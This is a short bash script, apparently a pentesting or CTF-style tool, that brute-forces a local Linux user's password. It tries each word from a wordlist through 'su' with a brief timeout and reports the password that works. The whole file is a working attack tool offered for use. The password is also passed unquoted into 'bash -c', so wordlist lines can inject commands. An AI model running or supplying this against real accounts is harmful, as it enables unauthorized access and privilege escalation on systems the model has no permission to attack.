#!/bin/bash

#Author		B3rm3 - C27 
#Version	1.0
#Date		1-6-24
#Descrption	Tool to bruteforce user in linux system (LOCAL)

#set -x #For Debug

#Colours
greenColour="\e[0;32m\033[1m"
endColour="\033[0m\e[0m"
redColour="\e[0;31m\033[1m"
blueColour="\e[0;34m\033[1m"
yellowColour="\e[0;33m\033[1m"
purpleColour="\e[0;35m\033[1m"
turquoiseColour="\e[0;36m\033[1m"
orangeColour="\e[0;33m\033[38;5;208m"


ctrl_c(){
	# Function to end script
	echo -e "${redColour}[!] Exiting!...${endColour}"
	tput cnorm; exit 1
}

trap ctrl_c INT
tput civis

help_Panel(){
	# Function to show help panel
	#tput clear
	echo -e "${orangeColour}[!] Usage : $0 -u USER -w WORDLIST${endColour}\n"
	echo -e "${orangeColour}-u <USER>\t\tUser to bruteforce${endColour}"
	echo -e "${orangeColour}-w <WORDLIST.txt>\tPassword Wordlist ${endColour}"
	echo -e "${orangeColour}-t X\t\t\tTimeout delay (not use) ${endColour}"
	echo -e "${orangeColour}-h\t\t\tShow this panel ${endColour}"
	tput cnorm; exit 1
}

bruteit(){
	echo -e "[#] Starting Attack\n"
	while IFS= read -r password; do
		echo -e "${orangeColour}[#] Testing password $password ${endColour}"
		timeout 0.1 bash -c "echo $password | su -c 'echo -e ' $USERNAME 2>/dev/null"
	
	if [ $? -eq 0 ];then
		echo -e "${greenColour}[$] The password for $USERNAME is :${endColour}${blueColour} $password${endColour}"
		tput cnorm; exit 0
	fi
	done < "$WORDLIST"
	tput cnorm; exit 1	
}


if [[ $# = 0 ]]; then
	help_Panel
fi

while getopts "u:w:h" opt; do
	case $opt in
	u)
	USERNAME="$OPTARG"
	;;

	w)
	WORDLIST="$OPTARG"
	;;

	h)
	help_Panel
	;;

	*)
	help_Panel
	;;
	
	esac
done

if [ -z "$USERNAME" ] || [ -z "$WORDLIST" ]; then
	echo -e "[!] Error :"
	help_Panel

fi

echo -e "[$] Selected user: $USERNAME"
echo -e "[$] Selected wordlist: $WORDLIST"
bruteit
